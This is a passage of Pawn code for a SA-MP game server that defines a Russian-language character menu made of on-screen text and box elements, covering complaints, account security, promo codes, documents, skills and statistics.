	TextDrawColor(TDEditor_MENU_GLOBAL[27], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[27], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[27], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[27], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[27], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[27], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[27], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[27], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[27], 0);

	TDEditor_MENU_GLOBAL[28] = TextDrawCreate(24.199996, 136.771911, "отправить_жалобу");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[28], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[28], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[28], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[28], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[28], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[28], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[28], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[28], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[28], 0);

	TDEditor_MENU_GLOBAL[29] = TextDrawCreate(24.199996, 151.172363, "задать_вопрос");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[29], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[29], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[29], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[29], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[29], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[29], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[29], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[29], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[29], 0);

	TDEditor_MENU_GLOBAL[30] = TextDrawCreate(24.199996, 165.173217, "безопасность_аккаунта");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[30], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[30], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[30], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[30], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[30], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[30], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[30], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[30], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[30], 0);

	TDEditor_MENU_GLOBAL[31] = TextDrawCreate(24.199996, 178.574035, "улучшения");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[31], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[31], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[31], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[31], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[31], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[31], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[31], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[31], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[31], 0);

	TDEditor_MENU_GLOBAL[32] = TextDrawCreate(24.199996, 192.074859, "смена_никнейма");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[32], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[32], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[32], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[32], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[32], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[32], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[32], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[32], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[32], 0);

	TDEditor_MENU_GLOBAL[33] = TextDrawCreate(24.199996, 206.075714, "");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[33], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[33], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[33], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[33], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[33], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[33], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[33], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[33], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[33], 0);

	TDEditor_MENU_GLOBAL[34] = TextDrawCreate(48.699554, 295.479248, "m4_______________shotgun___________deagle");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[34], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[34], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[34], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[34], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[34], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[34], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[34], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[34], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[34], 0);

	TDEditor_MENU_GLOBAL[35] = TextDrawCreate(25.802707, 336.614318, "посмотреть_весь_список");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[35], 0.186000, 1.079375);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[35], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[35], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[35], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[35], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[35], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[35], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[35], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[35], 0);

	TDEditor_MENU_GLOBAL[36] = TextDrawCreate(233.000946, 270.139801, "паспорт~n~управление_наземными_т/с~n~управление_воздушными_т/c~n~управление_водными_т/с~n~мед_карта~n~лицензия_на_оружие");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[36], 0.186000, 0.989373);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[36], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[36], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[36], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[36], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[36], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[36], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[36], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[36], 0);

	TDEditor_MENU_GLOBAL[37] = TextDrawCreate(230.400756, 338.238616, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[37], 0.000000, 1.419978);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[37], 420.171142, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[37], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[37], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[37], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[37], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[37], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[37], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[37], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[37], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[37], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[37], 0);

	TDEditor_MENU_GLOBAL[38] = TextDrawCreate(231.200714, 339.501647, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[38], 0.000000, 1.197968);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[38], 419.170166, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[38], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[38], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[38], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[38], 145);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[38], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[38], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[38], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[38], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[38], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[38], 0);

	TDEditor_MENU_GLOBAL[39] = TextDrawCreate(242.300323, 339.150024, "время:~y~_00:00____________~w~дата:_~y~21.01.2018");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[39], 0.234999, 1.140625);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[39], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[39], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[39], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[39], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[39], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[39], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[39], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[39], 0);

	TDEditor_MENU_GLOBAL[40] = TextDrawCreate(117.409133, 110.847656, "меню_персонажа");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[40], 0.150499, 0.913124);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[40], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[40], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[40], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[40], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[40], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[40], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[40], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[40], 0);

	TDEditor_MENU_GLOBAL[41] = TextDrawCreate(117.409133, 271.856170, "навыки_персонажа");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[41], 0.150499, 0.913124);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[41], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[41], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[41], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[41], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[41], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[41], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[41], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[41], 0);

	TDEditor_MENU_GLOBAL[42] = TextDrawCreate(323.308990, 111.992774, "настройки_персонажа");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[42], 0.150499, 0.913124);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[42], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[42], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[42], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[42], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[42], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[42], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[42], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[42], 0);

	TDEditor_MENU_GLOBAL[43] = TextDrawCreate(324.909057, 258.624084, "документы_персонажа");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[43], 0.150499, 0.913124);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[43], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[43], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[43], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[43], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[43], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[43], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[43], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[43], 0);

	TDEditor_MENU_GLOBAL[44] = TextDrawCreate(522.409912, 111.836616, "статистика_персонажа");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[44], 0.150499, 0.913124);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[44], 2);
	TextDrawColor(TDEditor_MENU_GLOBAL[44], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[44], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[44], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[44], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[44], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[44], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[44], 0);

	TDEditor_MENU_GLOBAL[45] = TextDrawCreate(429.400787, 338.863494, "box");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[45], 0.000000, 1.014978);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[45], 616.650634, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[45], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[45], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[45], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[45], 865730559);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[45], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[45], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[45], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[45], 1);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[45], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[45], 0);

	TDEditor_MENU_GLOBAL[46] = TextDrawCreate(18.600013, 123.796714, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[46], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[46], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[46], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[46], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[46], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[46], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[46], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[46], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[46], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[46], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[46], true);

/*	TDEditor_MENU_GLOBAL[47] = TextDrawCreate(18.800016, 220.746765, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[47], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[47], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[47], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[47], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[47], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[47], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[47], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[47], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[47], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[47], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[47], true);*/

	TDEditor_MENU_GLOBAL[48] = TextDrawCreate(18.800016, 234.547607, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[48], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[48], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[48], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[48], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[48], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[48], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[48], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[48], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[48], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[48], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[48], true);

	TDEditor_MENU_GLOBAL[49] = TextDrawCreate(18.800016, 248.548461, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[49], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[49], 204.589126, 12.529943);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[49], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[49], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[49], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[49], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[49], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[49], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[49], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[49], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[49], true);

	TDEditor_MENU_GLOBAL[50] = TextDrawCreate(24.899993, 219.775695, "дополнительные_возможности");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[50], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[50], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[50], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[50], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[50], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[50], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[50], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[50], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[50], 0);

	TDEditor_MENU_GLOBAL[51] = TextDrawCreate(24.899993, 233.576538, "промокод");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[51], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[51], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[51], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[51], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[51], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[51], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[51], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[51], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[51], 0);

	TDEditor_MENU_GLOBAL[52] = TextDrawCreate(24.899993, 247.377380, "закрыть_панель");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[52], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[52], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[52], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[52], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[52], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[52], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[52], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[52], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[52], 0);

	TDEditor_MENU_GLOBAL[53] = TextDrawCreate(25.699979, 122.314872, "команды_сервера");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[53], 0.238499, 1.433750);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[53], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[53], -1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[53], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[53], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[53], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[53], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[53], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[53], 0);

	TDEditor_MENU_GLOBAL[54] = TextDrawCreate(358.699859, 123.684265, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[54], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[54], 14.000000, 11.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[54], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[54], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[54], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[54], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[54], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[54], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[54], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[54], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[54], true);

	TDEditor_MENU_GLOBAL[55] = TextDrawCreate(358.799835, 135.547180, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[55], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[55], 14.000000, 10.310029);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[55], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[55], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[55], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[55], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[55], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[55], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[55], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[55], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[55], true);

	TDEditor_MENU_GLOBAL[56] = TextDrawCreate(358.699768, 146.947875, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[56], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[56], 14.000000, 10.869974);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[56], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[56], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[56], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[56], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[56], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[56], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[56], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[56], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[56], true);

	TDEditor_MENU_GLOBAL[57] = TextDrawCreate(358.799774, 158.648590, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[57], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[57], 14.000000, 11.059968);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[57], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[57], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[57], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[57], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[57], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[57], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[57], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[57], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[57], true);

	TDEditor_MENU_GLOBAL[58] = TextDrawCreate(358.699768, 170.349304, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[58], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[58], 14.000000, 11.479988);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[58], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[58], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[58], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[58], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[58], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[58], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[58], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[58], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[58], true);

	TDEditor_MENU_GLOBAL[59] = TextDrawCreate(358.699768, 182.750061, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[59], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[59], 14.000000, 11.479988);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[59], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[59], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[59], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[59], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[59], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[59], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[59], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[59], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[59], true);

	TDEditor_MENU_GLOBAL[60] = TextDrawCreate(358.899780, 195.350830, "LD_SPAC:white");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[60], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[60], 14.000000, 11.479988);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[60], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[60], 391614975);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[60], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[60], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[60], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[60], 4);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[60], 0);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[60], 0);
	TextDrawSetSelectable(TDEditor_MENU_GLOBAL[60], true);

	TDEditor_MENU_GLOBAL[61] = TextDrawCreate(234.899902, 125.502365, "появление_персонажа");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[61], 0.137499, 0.809373);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[61], 355.808837, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[61], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[61], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[61], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[61], 408524031);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[61], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[61], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[61], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[61], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[61], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[61], 0);

	TDEditor_MENU_GLOBAL[62] = TextDrawCreate(234.899902, 137.002883, "действия_администрации");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[62], 0.137499, 0.799372);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[62], 355.808837, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[62], 1);
	TextDrawColor(TDEditor_MENU_GLOBAL[62], -1);
	TextDrawUseBox(TDEditor_MENU_GLOBAL[62], 1);
	TextDrawBoxColor(TDEditor_MENU_GLOBAL[62], 408524031);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[62], 0);
	TextDrawSetOutline(TDEditor_MENU_GLOBAL[62], 0);
	TextDrawBackgroundColor(TDEditor_MENU_GLOBAL[62], 255);
	TextDrawFont(TDEditor_MENU_GLOBAL[62], 2);
	TextDrawSetProportional(TDEditor_MENU_GLOBAL[62], 1);
	TextDrawSetShadow(TDEditor_MENU_GLOBAL[62], 0);

	TDEditor_MENU_GLOBAL[63] = TextDrawCreate(234.899902, 148.503585, "ники_игроков");
	TextDrawLetterSize(TDEditor_MENU_GLOBAL[63], 0.137499, 0.829375);
	TextDrawTextSize(TDEditor_MENU_GLOBAL[63], 355.808837, 0.000000);
	TextDrawAlignment(TDEditor_MENU_GLOBAL[63], 1);
